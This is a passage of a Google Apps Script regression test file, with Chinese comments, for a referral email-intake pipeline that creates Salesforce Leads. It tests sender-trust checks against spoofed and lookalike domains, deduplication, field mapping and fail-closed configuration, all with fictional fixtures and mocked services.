/**
 * PlentiTests.gs —— Plenti 路径回归测试。
 *
 * 全部使用虚构数据。fixture 由 test/offline.cjs 从 test/fixtures/*.json
 * 读入并注入全局 PLENTI_FIXTURES;本文件不含任何真实客户信息,
 * 也不发起任何 Gmail / Salesforce 调用。
 *
 * 分工:message 形态的用例(邮件头才是重点)走 .json fixture;
 * 纯字符串分类用例(主题 + 发件人)用行内表格,与 Tests.gs 的既有风格一致。
 *
 * 入口:runPlentiRegressionTests()
 */

// ============================================================
// 测试基础设施
// ============================================================

function plAssert_(condition,message){if(!condition)throw new Error('ASSERT: '+message);}

function plAssertEq_(actual,expected,message){
 if(actual!==expected)throw new Error('ASSERT: '+message+' — got '+JSON.stringify(actual)+', expected '+JSON.stringify(expected));
}

function plAssertThrows_(fn,pattern,message){
 var threw=false,text='';
 try{fn();}catch(e){threw=true;text=String(e.message||e);}
 if(!threw)throw new Error('ASSERT: '+message+' — expected a throw, got none');
 if(!pattern.test(text))throw new Error('ASSERT: '+message+' — thrown message did not match '+pattern+': '+text);
}

function plFixtures_(){
 if(typeof PLENTI_FIXTURES==='undefined')throw new Error('Fixtures are injected by test/offline.cjs. Run: node test/offline.cjs');
 return PLENTI_FIXTURES;
}

/** 由 fixture 名构造邮件 mock。 */
function plTestMessage_(name){
 var f=plFixtures_()[name];
 if(!f)throw new Error('Unknown fixture: '+name);
 return plTestMessageFrom_(f);
}

/** 由行内对象构造邮件 mock,形状与 fixture 相同。 */
function plTestMessageFrom_(f){
 return {
  getId:function(){return f.id;},
  getSubject:function(){return f.subject||'';},
  getFrom:function(){return f.from||'';},
  getDate:function(){return new Date(f.date||'2026-09-07T00:00:00.000Z');},
  getPlainBody:function(){return f.body||'';},
  getBody:function(){return f.html||'';},
  getHeader:function(n){var h=f.headers||{};return Object.prototype.hasOwnProperty.call(h,n)?h[n]:'';},
  getRawContent:function(){throw new Error('getRawContent must not be called in offline tests');},
  getThread:function(){throw new Error('getThread must not be called in offline tests');}
 };
}

function plTestSetProps_(obj){
 var p=PropertiesService.getScriptProperties();
 Object.keys(obj).forEach(function(k){if(obj[k]===null)p.deleteProperty(k);else p.setProperty(k,obj[k]);});
}

/** 每个测试开头调用,保证起点一致。全部为虚构值。 */
function plTestBaseline_(){
 plTestSetProps_({
  PLENTI_TRUSTED_SENDERS:'@plenti.example, referrals@partner.example',
  INTAKE_RECIPIENT_ALLOWLIST:'edocs@example.org, jack.fixture@example.com',
  INTERNAL_DOMAIN:'example.org',
  EDOCS_GROUP_ADDRESS:'edocs@example.org',
  INTAKE_MAILBOX:'edocs-copy@example.org',
  INTAKE_ADMIN_ID:'005000000000000AAA',
  // [R17] 刻意用和代码旧写死值('Plenti')不同的值,证明是从属性读的
  PLENTI_LEAD_SOURCE:'Plenti Referrals',
  ATTACH_RAW_EMAIL:null
 });
 plTestClearState_();
 // [R12] 可选字段探测按执行缓存,用例之间必须清掉,否则会互相污染
 plLeadFieldMap_.cache=null;
}

/** 清掉运行时状态属性,让每个用例互不影响。 */
function plTestClearState_(){
 var p=PropertiesService.getScriptProperties(),all=p.getProperties();
 Object.keys(all).forEach(function(k){if(k.indexOf('IV2_')===0)p.deleteProperty(k);});
}

/**
 * 用假的 Salesforce 层跑一段逻辑,记录全部调用。
 * UrlFetchApp 的桩仍然会抛错 —— 这里替换的是它上面一层,任何漏网的
 * 真实请求都会立刻炸出来,不会静默走出去。
 */
function plTestWithFakeApi_(fn){
 var realReq=ivReq_,realQuery=ivQuery_,calls=[];
 ivReq_=function(path,method,data){calls.push({kind:'req',path:path,method:method||'get',data:data});return {id:'00Qfixture000001AAA'};};
 ivQuery_=function(q){
  calls.push({kind:'query',query:q});
  if(/WHERE Id='/.test(q))return [{Id:'00Qfixture000001AAA',Description:'',IsConverted:false,Status:'New'}];
  return [];
 };
 try{return fn(calls);}finally{ivReq_=realReq;ivQuery_=realQuery;}
}

function plTestPosts_(calls){return calls.filter(function(c){return c.kind==='req'&&c.method==='post';});}

/**
 * [R8] 用假的 UrlFetchApp 跑一段逻辑。handler(url) 返回 {code, text},
 * 返回 null 表示模拟抛错(网络故障)。离线测试默认的 UrlFetchApp 桩是抛错的,
 * 这里只在用例内临时替换,跑完还原。
 */
function plTestWithFetch_(handler,fn){
 var real=UrlFetchApp.fetch,fetched=[];
 UrlFetchApp.fetch=function(url,options){
  fetched.push({url:url,options:options});
  var r=handler(url);
  if(!r)throw new Error('SIMULATED NETWORK FAILURE');
  return {getResponseCode:function(){return r.code;},getContentText:function(){return r.text||'';}};
 };
 try{return fn(fetched);}finally{UrlFetchApp.fetch=real;}
}

/**
 * [R9] 用假的 GmailApp 跑一段逻辑。messages 是 {id: messageMock} 映射。
 * 默认的 GmailApp 桩是抛错的,这里只在用例内临时替换。
 */
function plTestWithGmail_(messages,fn){
 var realGet=GmailApp.getMessageById,realLabel=GmailApp.getUserLabelByName,labels=[];
 GmailApp.getMessageById=function(id){return messages[id]||null;};
 GmailApp.getUserLabelByName=function(name){return {name:name,addLabel:null};};
 try{return fn(labels);}finally{GmailApp.getMessageById=realGet;GmailApp.getUserLabelByName=realLabel;}
}

/** [R9] 捕获写进 Sheet 的行。 */
function plTestWithSheet_(fn){
 var real=SpreadsheetApp.openById,summary=[],messages=[],msgTab=null;
 function tab(rows){return {getLastRow:function(){return rows.length;},
  appendRow:function(r){rows.push(r);},
  getRange:function(){return {setValues:function(values){values.forEach(function(v){rows.push(v);});}};}};}
 SpreadsheetApp.openById=function(){return {
  getSheets:function(){return [tab(summary)];},
  getNumSheets:function(){return msgTab?2:1;},
  getSheetByName:function(n){return n==='Messages'?msgTab:null;},
  insertSheet:function(){msgTab=tab(messages);return msgTab;}};};
 try{return fn({summary:summary,messages:messages});}finally{SpreadsheetApp.openById=real;}
}

/** 合成页面 fixture 的 HTML。 */
function plTestBrowserHtml_(){return plFixtures_()['browser-view-sample'].html;}
function plTestBrowserToken_(){return plFixtures_()['browser-view-sample'].token;}

/** 一个通过解析的虚构转介,用于绕过骨架期的空正则测试下游逻辑。 */
function plTestParsed_(){
 return {kind:'referral',referralId:'FIXTURE-0001',receivedAt:'2026-09-07T02:15:00.000Z',
  customer:{firstName:'Dale',lastName:'Example',email:'dale.example@example.net',phone:'0400000001',street:'12 Fictional Street',city:'Sampletown',state:'sa',postcode:'5000'},
  confidence:'high',missing:[],ambiguous:[],reason:'Parsed as referral'};
}

// ============================================================
// 1. 发件人可信验证(规格 §5.1)
// ============================================================

function testPlentiSourceTrust(){
 plTestBaseline_();
 var cases=[
  ['trusted-referral',true,/DMARC pass/],
  ['trusted-noreply',true,/DMARC pass/],
  ['trusted-with-promo-footer',true,/DMARC pass/],
  ['spoofed-plenti',false,/not listed in PLENTI_TRUSTED_SENDERS/],
  ['unlisted-sender-dmarc-pass',false,/not listed in PLENTI_TRUSTED_SENDERS/],
  ['lookalike-domain',false,/not listed in PLENTI_TRUSTED_SENDERS/],
  ['suffix-domain',false,/not listed in PLENTI_TRUSTED_SENDERS/],
  ['subdomain-sender',false,/not listed in PLENTI_TRUSTED_SENDERS/],
  ['auth-header-missing',false,/X-Original-Authentication-Results header missing/],
  ['original-sender-missing',false,/X-Original-Sender header missing/],
  ['header-from-mismatch',false,/header\.from domain does not match/]
 ];
 cases.forEach(function(c){
  var r=isPlentiSource_(plTestMessage_(c[0]));
  plAssertEq_(r.trusted,c[1],c[0]+' trusted flag');
  plAssert_(c[2].test(r.reason),c[0]+' reason should match '+c[2]+', got: '+r.reason);
 });

 // 可信清单命中,但 DMARC 未通过 —— 第 4 步的严格判定
 var dmarcFail=isPlentiSource_(plTestMessageFrom_({
  id:'inline-dmarc-fail',subject:'New customer referral',date:'2026-09-07T03:10:00.000Z',
  headers:{'X-Original-Sender':'referrals@plenti.example',
           'X-Original-Authentication-Results':'mx.example.org; dkim=pass; spf=pass; dmarc=fail header.from=plenti.example'},
  body:'Referral reference: FIXTURE-0011\n'}));
 plAssertEq_(dmarcFail.trusted,false,'listed sender with dmarc=fail must not be trusted');
 plAssert_(/DMARC did not pass/.test(dmarcFail.reason),'dmarc=fail reason');

 // 只有 spf=pass / dkim=pass 而无 dmarc=pass 也不放行(D-009 严格版)
 var spfOnly=isPlentiSource_(plTestMessageFrom_({
  id:'inline-spf-only',subject:'New customer referral',date:'2026-09-07T03:11:00.000Z',
  headers:{'X-Original-Sender':'referrals@plenti.example',
           'X-Original-Authentication-Results':'mx.example.org; dkim=pass; spf=pass smtp.mailfrom=plenti.example'},
  body:'Referral reference: FIXTURE-0012\n'}));
 plAssertEq_(spfOnly.trusted,false,'spf/dkim pass without dmarc=pass must not be trusted');

 // 显示名与主题写着 Plenti 不构成任何证据
 var spoof=plTestMessage_('spoofed-plenti');
 plAssert_(/Plenti/.test(spoof.getFrom())&&/Plenti/.test(spoof.getSubject()),'fixture should claim Plenti in display name and subject');
 plAssertEq_(isPlentiSource_(spoof).trusted,false,'display name and subject must not confer trust');

 console.log('PASS: 11 source-trust fixtures, 2 DMARC strictness cases, 1 spoofing case');
}

// ============================================================
// 2. 可信清单的域名边界(不得用子串匹配)
// ============================================================

function testPlentiTrustedSenderBoundary(){
 plTestBaseline_();
 var entries=['@plenti.example','referrals@partner.example'];
 var cases=[
  ['referrals@plenti.example',true,'exact domain entry'],
  ['REFERRALS@PLENTI.EXAMPLE',true,'case insensitive'],
  ['referrals@partner.example',true,'exact address entry'],
  ['referrals@evil-plenti.example',false,'lookalike prefix must not match on a substring'],
  ['referrals@plenti.example.attacker.example',false,'trusted domain used as a prefix must not match'],
  ['referrals@mail.plenti.example',false,'subdomain is not automatically trusted'],
  ['referrals@xplenti.example',false,'no domain-boundary bypass'],
  ['other@partner.example',false,'address entry must not widen to the whole domain'],
  ['',false,'empty address'],
  ['not-an-address',false,'unparsable address']
 ];
 cases.forEach(function(c){plAssertEq_(plSenderTrusted_(c[0],entries),c[1],c[2]+' ('+c[0]+')');});
 console.log('PASS: 10 trusted-sender boundary cases');
}

// ============================================================
// 3. 排除规则(移植自模板 ivClassify_ 前半段)
// ============================================================

function testPlentiExclusions(){
 plTestBaseline_();
 var cases=[
  ['staff@example.org','Weekly internal update','internal'],
  ['noreply@notice.salesforce.com','Please follow up Your Unconverted Lead - Example Customer','ignore'],
  ['noreply@notice.salesforce.com','Salesforce could not create this lead','review'],
  ['someone@other.example','TEST2 referral batch','review'],
  ['mailer-daemon@other.example','Returned mail: see transcript','ignore'],
  ['postmaster@other.example','Undeliverable message','ignore'],
  ['someone@other.example','Out of office','ignore'],
  ['someone@other.example','Delivery Status Notification (Failure)','ignore'],
  ['someone@other.example','Automatic reply: annual leave','ignore']
 ];
 cases.forEach(function(c){
  var r=plExclude_(c[1],c[0]);
  plAssert_(r,'expected exclusion for '+c[1]);
  plAssertEq_(r.kind,c[2],'exclusion kind for "'+c[1]+'"');
 });

 // no-reply 地址不再被自动排除 —— 交给可信验证判断(PLENTI_ADAPTATION §2)
 plAssertEq_(plExclude_('New customer referral','no-reply@plenti.example'),null,'no-reply address must not be excluded outright');
 plAssertEq_(plExclude_('New customer referral','noreply@plenti.example'),null,'noreply address must not be excluded outright');
 plAssertEq_(plExclude_('New customer referral','referrals@plenti.example'),null,'ordinary trusted sender is not excluded');

 // 内部域名判定在域名边界上做
 plAssertEq_(plExclude_('Hello','staff@notexample.org'),null,'internal check must not match a different domain');
 plAssertEq_(plExclude_('Hello','staff@sub.example.org'),null,'internal check does not widen to subdomains');

 console.log('PASS: 9 exclusion cases, 3 no-reply cases, 2 internal-domain boundary cases');
}

// ============================================================
// 4. 空发件人绝不判 internal(必须有人看到)
// ============================================================

function testPlentiEmptySenderNeverInternal(){
 plTestBaseline_();
 // 这条硬要求没有松动:空发件人**绝不判 internal、绝不静默丢弃**。
 // Q10 收窄(D-027)改的只是"打不打标签",由有没有 Plenti 链接决定。
 var direct=plExclude_('New customer referral','');
 plAssert_(direct,'empty sender must produce an exclusion result, not null');
 plAssertEq_(direct.kind,'review','empty sender must be review');
 plAssert_(direct.kind!=='internal','empty sender must NEVER be classified internal');
 plAssertEq_(direct.unverified,true,'and it is tagged for the shared visibility decision');
 plAssert_(/Sender could not be determined/.test(direct.reason),'empty sender reason');

 function run(fixture){
  plTestClearState_();
  return plTestWithFakeApi_(function(calls){
   var s=plProcess_(plTestMessage_(fixture),false);
   plAssertEq_(plTestPosts_(calls).length,0,fixture+': nothing is written to Salesforce');
   return s;
  });
 }

 // ---- 无 Plenti 链接:落 review、进 Messages 表,但不占标签 ----
 var plain=run('original-sender-missing');
 // [Q18] 无链接 = 普通流量,不需要人帮忙 → done(D-033)。"绝不静默丢弃"由下面两条守住:
 // 状态照常落盘、Messages 表照常一整行带 reason。
 plAssertEq_(plain.state,'done','[Q18] missing X-Original-Sender without a Plenti link is ordinary traffic — done, not review');
 plAssertEq_(plain.kind,'review','and never kind internal');
 plAssertEq_(plain.leadCandidate,false,'but with no Plenti link it does not occupy the Review label (D-027)');
 plAssertEq_(plain.scope,'out-of-scope','and is categorised as ordinary mailbox traffic');
 plAssertEq_(ivLeadLabelFlags_([plain]).review,false,'no label');
 plAssert_(PropertiesService.getScriptProperties().getProperty('IV2_MSG_'+plTestMessage_('original-sender-missing').getId()),
  'the state IS persisted — visibility moves to the Messages log, it is not a silent drop');

 // ---- 有 Plenti 链接:必须打标签 ----
 //     这正是原来那条规则要保护的情形,现在被精确地保住了。
 plTestClearState_();
 var linked=plTestMessageFrom_({id:'empty-sender-with-link',subject:'Action required: New lead',
  date:'2026-09-10T01:00:00.000Z',headers:{'To':'eDocs <edocs@example.org>'},
  from:'Someone <someone@elsewhere.example>',
  body:'View in Browser: https://e.customeriomail.com/deliveries/'+plTestBrowserToken_()+'\n'});
 var withLink=plTestWithFakeApi_(function(calls){
  var s=plProcess_(linked,false);
  plAssertEq_(plTestPosts_(calls).length,0,'still nothing written — it is not verified');
  return s;
 });
 plAssertEq_(withLink.leadCandidate,true,'a Plenti link with no verifiable sender MUST be labelled');
 plAssertEq_(withLink.scope,'unverified-with-link','and flagged as needing a human');
 plAssert_(/NEEDS A HUMAN/.test(withLink.reason),'the reason says so loudly');
 plAssertEq_(ivLeadLabelFlags_([withLink]).review,true,'SF-Lead-Review lights');
 plAssertEq_(ivLeadLabelFlags_([withLink]).created,false,'no Lead was created');

 plTestClearState_();
 plTestBaseline_();
 console.log('PASS: empty sender is never internal, never dropped; the label is reserved for messages that carry a Plenti link');
}

// ============================================================
// 5. 不可信邮件只细化 reason,结论恒为 review
// ============================================================

function testPlentiUntrustedReason(){
 plTestBaseline_();
 plAssert_(/Employment enquiry/.test(plUntrustedReason_('EOI - Trade Assistant','Dear Recruitment Team, please find my cover letter attached')),'recruitment refinement');
 plAssert_(/offering products/.test(plUntrustedReason_('Partnership','Our company is offering investment opportunities for investors and developers.')),'promotion refinement');
 plAssert_(/Voice recording/.test(plUntrustedReason_('New voice message from 0400 000 000','')),'voicemail refinement');
 plAssertEq_(plUntrustedReason_('New customer referral','Referral reference: FIXTURE-0001'),'','no refinement for ordinary text');
 console.log('PASS: 4 untrusted-reason refinement cases');
}

// ============================================================
// 6. 解析骨架:字段正则留空时的行为
// ============================================================

function testPlentiParserSkeleton(){
 plTestBaseline_();
 var parsed=parsePlentiReferral_(plTestMessage_('trusted-referral'));
 plAssertEq_(parsed.kind,'unknown','no kind patterns are defined yet, so kind must be unknown');
 plAssertEq_(parsed.confidence,'low','unknown kind can never be high confidence');
 plAssertEq_(parsed.referralId,'','no referral-id pattern is defined yet');
 plAssertEq_(parsed.customer.email,'','no email pattern is defined yet');
 plAssertEq_(parsed.missing.length,PLENTI_REQUIRED_FIELDS.length,'every required field is missing while patterns are empty');
 plAssert_(/kind not recognised/.test(parsed.reason)&&/Missing required field/.test(parsed.reason),'reason explains both problems');

 // 客户身份绝不回退到发件人(规格 §5.2)
 plAssert_(parsed.customer.email!=='referrals@plenti.example','customer email must never fall back to the sender address');

 // 多候选检测:同一字段匹出两个不同值 → ambiguous → 无法 high
 var saved=PLENTI_PATTERNS.email;
 PLENTI_PATTERNS.email=[/Email:\s*(\S+)/i,/Contact:\s*(\S+)/i];
 var ambiguous=parsePlentiReferral_(plTestMessageFrom_({
  id:'inline-ambiguous',subject:'New customer referral',date:'2026-09-07T03:20:00.000Z',headers:{},
  body:'Email: one@example.net\nContact: two@example.net\n'}));
 PLENTI_PATTERNS.email=saved;
 plAssert_(ambiguous.ambiguous.indexOf('email')>=0,'two different values for one field must be flagged ambiguous');
 plAssertEq_(ambiguous.confidence,'low','ambiguous fields can never be high confidence');
 plAssert_(/Multiple candidate values/.test(ambiguous.reason),'ambiguity reason');

 console.log('PASS: 9 parser-skeleton cases including multi-candidate detection');
}

// ============================================================
// 7. 业务级去重未实现时必须卡死(fail-closed)
// ============================================================

function testPlentiReferralLookupFailClosed(){
 plTestBaseline_();
 // [R8] plFindReferral_ 已从 fail-closed 桩落地为真实 SOQL 查询(Q6 已定:
 // delivery token 存 Plenti_Lead_ID__c)。这里改测它的查询语义。
 plTestWithFakeApi_(function(calls){
  plAssertEq_(plFindReferral_(''),null,'an empty token never queries');
  plAssertEq_(calls.length,0,'no query is issued for an empty token');
 });
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});return [];};
  plAssertEq_(plFindReferral_('TOKEN-1'),null,'no match returns null');
  plAssert_(/Plenti_Lead_ID__c='TOKEN-1'/.test(calls[0].query),'the lookup queries Plenti_Lead_ID__c');
 });
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});return [{Id:'00Qexisting00001AAA'},{Id:'00Qexisting00002AAA'}];};
  plAssertThrows_(function(){plFindReferral_('TOKEN-2');},/Multiple Leads share/,'duplicate tokens must stop and ask for a human');
 });
 // 没有 token 就不建 Lead —— 身份不确定时依旧转 review
 plTestWithFakeApi_(function(calls){
  var noId=plTestParsed_();noId.referralId='';
  plAssert_(/No Plenti delivery token/.test(plResolve_(plTestMessage_('trusted-referral'),noId).review||''),'missing token must review');
  plAssertEq_(plTestPosts_(calls).length,0,'nothing is written without an identifier');
 });
 console.log('PASS: 6 referral-lookup cases (token-keyed deduplication)');
}

// ============================================================
// 8. 去重的另外两层
// ============================================================

function testPlentiDeduplicationLayers(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),parsed=plTestParsed_();

 // 第 2 层 业务级:同一 delivery token 已建过 → 返回既有 Lead,不重复创建。
 // 这一层同时覆盖"同一封邮件跑两次"和"同一转介重发成新邮件"。
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});return [{Id:'00Qexisting00001AAA',Description:'',IsConverted:false,Status:'New'}];};
  var r=plResolve_(message,parsed);
  plAssert_(r.lead&&r.lead.Id==='00Qexisting00001AAA','an existing delivery token resolves to the existing Lead');
  plAssert_(!r.create,'must not request creation');
  plAssertEq_(plTestPosts_(calls).length,0,'a resent referral must not create a second Lead');
 });

 // 第 3 层 跨邮箱缓解:仅在有客户邮箱时可用
 plTestWithFakeApi_(function(calls){
  var n=0;
  ivQuery_=function(q){calls.push({kind:'query',query:q});n++;
   if(/Plenti_Lead_ID__c/.test(q))return [];
   return [{Id:'00Qother0000001AAA',Description:'from the info mailbox',IsConverted:false,Status:'New'}];};
  var r=plResolve_(message,parsed);
  plAssert_(/Existing active Lead/.test(r.review||''),'an active Lead for the same customer email goes to review');
  plAssertEq_(plTestPosts_(calls).length,0,'cross-mailbox collision must not create a second Lead');
 });

 // 没有客户邮箱时(Plenti 的常态)跨邮箱这一层不可用,但仍然要建 Lead
 plTestWithFakeApi_(function(calls){
  ivQuery_=function(q){calls.push({kind:'query',query:q});return [];};
  var noEmail=plTestParsed_();noEmail.customer.email='';
  plAssertEq_(plResolve_(message,noEmail).create,true,'a referral without a customer email is still created');
  plAssertEq_(calls.length,1,'only the token lookup runs when there is no email to query by');
 });
 console.log('PASS: 3 deduplication-layer cases');
}

// ============================================================
// 9. 创建前防重锁(规格 §2 第三样可继承的东西)
// ============================================================

function testPlentiCreateLock(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),parsed=plTestParsed_(),p=PropertiesService.getScriptProperties();

 plTestWithFakeApi_(function(calls){
  var lead=plCreateLead_(message,parsed);
  plAssertEq_(lead.Id,'00Qfixture000001AAA','create returns the read-back Lead');
  var posts=plTestPosts_(calls);
  plAssertEq_(posts.length,1,'exactly one POST');
  plAssertEq_(posts[0].path,'sobjects/Lead','POST target');
  var lock=JSON.parse(p.getProperty('IV2_CREATE_'+message.getId()));
  plAssertEq_(lock.state,'created','lock advances to created after a successful POST');
  plAssertEq_(lock.id,'00Qfixture000001AAA','lock records the new record id');
 });

 // 锁已存在 → 抛错要求人工核查,绝不重试创建
 plTestWithFakeApi_(function(calls){
  plAssertThrows_(function(){plCreateLead_(message,parsed);},/Earlier create outcome is uncertain/,'existing lock must block a retry');
  plAssertEq_(plTestPosts_(calls).length,0,'blocked retry must not POST');
 });

 // 写入顺序:requested 必须先于 POST 落盘,否则超时后无从判断
 plTestClearState_();
 plTestWithFakeApi_(function(calls){
  ivReq_=function(path,method,data){
   calls.push({kind:'req',path:path,method:method||'get',data:data});
   var atPost=JSON.parse(p.getProperty('IV2_CREATE_'+message.getId())||'{}');
   plAssertEq_(atPost.state,'requested','the lock must already read "requested" while the POST is in flight');
   return {id:'00Qfixture000001AAA'};
  };
  plCreateLead_(message,parsed);
 });
 console.log('PASS: 4 create-lock cases');
}

// ============================================================
// 10. Lead 字段映射(规格 §5.9 / §5.2 / §5.6)
// ============================================================

function testPlentiLeadPayload(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral'),parsed=plTestParsed_();
 var enrichment={html:'<html>browser view</html>',meta:{url:'https://e.customeriomail.com/deliveries/T==',token:'T==',ok:true,found:['name','address','systems'],missing:[],degraded:false}};
 var payload=plLeadPayload_(message,parsed,enrichment);

 plAssertEq_(payload.Email,'dale.example@example.net','Lead.Email must be the customer address');
 plAssert_(payload.Email!=='referrals@plenti.example','Lead.Email must never be the Plenti sender address');
 plAssertEq_(payload.LeadSource,'Plenti Referrals','LeadSource comes from PLENTI_LEAD_SOURCE, not a hardcoded value (D-029)');
 plAssertEq_(payload.Contact_Attempt_Count__c,0,'Contact_Attempt_Count__c starts at zero');
 plAssertEq_(payload.OwnerId,'005000000000000AAA','OwnerId comes from INTAKE_ADMIN_ID');
 plAssertEq_(payload.Status,'New','Status');
 // [R11] Plenti_Received_At__c 暂时不写(org 里没建,D-022),但时间戳不能丢
 plAssert_(!('Plenti_Received_At__c' in payload),'the field is omitted while it does not exist in the org — one missing field fails the whole request');
 plAssertEq_(JSON.parse(payload.Plenti_Parsed_JSON__c).receivedAt,message.getDate().toISOString(),'the received timestamp is preserved in the parsed JSON instead');
 plAssert_(!('Lead_Category__c' in payload),'Lead_Category__c is deliberately not written (D-011)');
 plAssertEq_(payload.StateCode,'SA','state code is upper-cased');
 plAssertEq_(payload.CountryCode,'AU','country code accompanies an Australian address');

 // [R8/D-013] delivery token 进 Plenti_Lead_ID__c;取不到就**不传该字段**
 plAssertEq_(payload.Plenti_Lead_ID__c,'FIXTURE-0001','the delivery token is stored as the external identifier');
 var noToken=plTestParsed_();noToken.referralId='';
 plAssert_(!('Plenti_Lead_ID__c' in plLeadPayload_(message,noToken,enrichment)),'no token means the field is omitted entirely, not written empty');

 // [D-014] 审计留底存**原始 HTML**,不是 Gmail 转好的纯文本
 plAssertEq_(payload.Plenti_Raw_Email__c,message.getBody(),'the raw email field stores getBody() HTML verbatim');
 plAssertEq_(payload.Plenti_Browser_View_HTML__c,'<html>browser view</html>','the fetched page is stored separately from the email');
 plAssert_(payload.Plenti_Raw_Email__c!==payload.Plenti_Browser_View_HTML__c,'the two sources are kept in separate fields');

 // 解析结果 JSON,且**不含**抓回来的页面本身
 var stored=JSON.parse(payload.Plenti_Parsed_JSON__c);
 plAssertEq_(stored.referralId,'FIXTURE-0001','parsed JSON carries the identifier');
 plAssert_(payload.Plenti_Parsed_JSON__c.indexOf('browser view')<0,'the 40KB page must not be duplicated into the JSON field');

 // [D-013] Description 是一行摘要,marker 是承重结构不能删
 plAssert_(payload.Description.indexOf('[Intake: '+message.getId()+']')===0,'Description starts with the message marker');
 plAssert_(payload.Description.indexOf('3 fields parsed')>=0,'Description records how many fields were parsed');
 plAssert_(payload.Description.split('\n').length===1,'Description is a single line');

 // [R13] ② 姓名写入位置。这里的 parsed 是测试助手造的、first/last 都有值;
 // 真正的 Plenti 路径只会填 lastName(整串不拆),那一条在
 // testPlentiSystemsVisible 的端到端用例里验证。
 plAssertEq_(payload.LastName,'Example','LastName carries the customer surname field verbatim');
 plAssertEq_(payload.FirstName,'Dale','FirstName is sent only when parsing actually produced one');
 var noFirst=plTestParsed_();noFirst.customer.firstName='';noFirst.customer.lastName='Gabby TEST';
 var whole=plLeadPayload_(message,noFirst,enrichment);
 plAssertEq_(whole.LastName,'Gabby TEST','the whole name goes into LastName, unsplit — no guessing where the surname starts');
 plAssert_(!('FirstName' in whole),'and FirstName is omitted entirely rather than written empty');
 plAssert_(payload.Description.length<=32000,'Description stays within the standard-field limit');
 plAssert_(payload.Description.indexOf('12 Fictional Street')<0,'the email body is not copied into Description (D-012)');

 // 降级时 Description 要显眼地标出来
 var degraded=plLeadPayload_(message,parsed,{html:'',meta:{found:[],degraded:true}});
 plAssert_(/CUSTOMER DETAILS MISSING/.test(degraded.Description),'a degraded Lead says so in Description so a human knows to open the link');
 plAssertEq_(degraded.Plenti_Browser_View_HTML__c,'','no page means an empty field, not a fabricated one');

 // 客户姓名取不到时用 token 兜底,**绝不用发件人地址**
 var anon=plTestParsed_();anon.customer.lastName='';anon.customer.email='';
 var anonPayload=plLeadPayload_(message,anon,{html:'',meta:{found:[],degraded:true}});
 plAssert_(/Plenti referral/.test(anonPayload.LastName),'a nameless referral still gets a usable LastName');
 plAssert_(!('Email' in anonPayload),'no customer email means the field is omitted, never filled with the sender address');

 // 截断:上限内含标记
 var huge=plTestParsed_();
 var hugePayload=plLeadPayload_(message,huge,{html:new Array(140000).join('x'),meta:{found:[]}});
 plAssert_(hugePayload.Plenti_Browser_View_HTML__c.length<=131072,'long text is truncated below the Salesforce field limit');
 plAssert_(/\[TRUNCATED\]$/.test(hugePayload.Plenti_Browser_View_HTML__c),'truncation is marked, and the marker counts inside the limit');
 console.log('PASS: 24 Lead field-mapping cases');
}

// ============================================================
// 11. .eml 留存默认关闭(规格 §5.6)
// ============================================================

function testPlentiRawEmailDefaultOff(){
 plTestBaseline_();
 var message=plTestMessage_('trusted-referral');
 plAssertEq_(ivAttachRawEmail_(),false,'ATTACH_RAW_EMAIL defaults to false when unset');
 plTestWithFakeApi_(function(calls){
  // getRawContent 在 mock 里会抛错;返回 false 且零调用才说明开关真的挡在最前面
  plAssertEq_(ivAttachSource_(message,{id:'00Qfixture000001AAA'}),false,'attachment is skipped while the switch is off');
  plAssertEq_(calls.length,0,'the switch must short-circuit before any query or upload');
 });
 plTestSetProps_({ATTACH_RAW_EMAIL:'false'});
 plAssertEq_(ivAttachRawEmail_(),false,'explicit "false" stays off');
 plTestSetProps_({ATTACH_RAW_EMAIL:'true'});
 plAssertEq_(ivAttachRawEmail_(),true,'only the exact string "true" turns it on');
 plTestSetProps_({ATTACH_RAW_EMAIL:null});
 console.log('PASS: 4 raw-email retention switch cases');
}

// ============================================================
// 12. 缺配置即抛错停止(规格 §3 禁止事项 #2)
// ============================================================

function testPlentiRequiredProperties(){
 plTestBaseline_();
 plTestSetProps_({PLENTI_TRUSTED_SENDERS:null});
 plAssertThrows_(function(){isPlentiSource_(plTestMessage_('trusted-referral'));},/PLENTI_TRUSTED_SENDERS/,'missing trusted-sender list must stop processing');
 plTestSetProps_({PLENTI_TRUSTED_SENDERS:'   ,  '});
 plAssertThrows_(function(){plTrustedSenders_();},/PLENTI_TRUSTED_SENDERS/,'a list of only separators counts as missing');

 plTestBaseline_();
 plTestSetProps_({INTERNAL_DOMAIN:null});
 plAssertThrows_(function(){plExclude_('Hello','someone@other.example');},/INTERNAL_DOMAIN/,'missing internal domain must stop processing');

 plTestBaseline_();
 plTestSetProps_({EDOCS_GROUP_ADDRESS:null});
 plAssertThrows_(function(){ivGroupAddress_();},/EDOCS_GROUP_ADDRESS/,'missing group address must stop processing');

 plTestBaseline_();
 plTestSetProps_({INTAKE_ADMIN_ID:'not-a-user-id'});
 plAssertThrows_(function(){plLeadPayload_(plTestMessage_('trusted-referral'),plTestParsed_());},/INTAKE_ADMIN_ID/,'invalid admin id must stop processing');

 plTestBaseline_();
 console.log('PASS: 5 missing-configuration cases');
}

// ============================================================
// 13. 端到端分流:没有任何一条路径会在骨架期写 Salesforce
// ============================================================

function testPlentiProcessFlow(){
 plTestBaseline_();
 // [D-027] 第三列是 leadCandidate(要不要占 SF-Lead-Review 标签)。
 // [Q18] 第二列:不可信且无链接的落 done(不需要人帮忙);可信但认不出的
 // 仍是 review —— 可信发件人发来的认不出的邮件可能是漏单,要人看。
 // 下面这些 fixture 正文里都**没有** Plenti browser-view 链接,所以一律
 // 落 review 状态但不打标签 —— 带链接的那一类在 testPlentiScopeNarrowing 里测。
 // 可信但解析不出的三条(trusted-*)是另一回事:它们通过了发件人验证,
 // 走的是判定门那条路,不受 Q10 收窄影响。
 var cases=[
  ['trusted-referral','review',true,/Not identifiable as a Plenti referral/],
  ['trusted-noreply','review',true,/Not identifiable as a Plenti referral/],
  ['trusted-with-promo-footer','review',true,/Not identifiable as a Plenti referral/],
  ['spoofed-plenti','done',false,/not a verified Plenti sender/],
  ['unlisted-sender-dmarc-pass','done',false,/not a verified Plenti sender/],
  ['auth-header-missing','done',false,/not a verified Plenti sender/],
